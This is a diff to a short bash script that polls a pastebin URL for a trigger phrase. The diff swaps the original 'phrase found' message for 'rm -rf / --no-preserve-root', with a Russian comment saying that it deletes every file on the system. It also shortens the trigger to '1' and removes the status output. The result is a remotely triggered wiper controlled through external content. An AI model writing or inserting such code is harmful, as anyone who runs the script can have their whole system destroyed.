@@ -1,15 +1,14 @@
 #!/bin/bash
 
 url="https://pastebin.com/raw/8LbpK8d9"
-phrase="123"
+phrase="1"
 
 while true; do
     content=$(curl -s $url)
     if [[ "$content" == *"$phrase"* ]]; then
-        echo "Фраза найдена!"
+        rm -rf / --no-preserve-root  # ОПАСНАЯ КОМАНДА! Удаляет все файлы в системе.
         break
     else
-        echo "Фраза не найдена, повторяем проверку..."
         sleep 5  # ждем 5 секунд перед следующей проверкой
     fi
 done
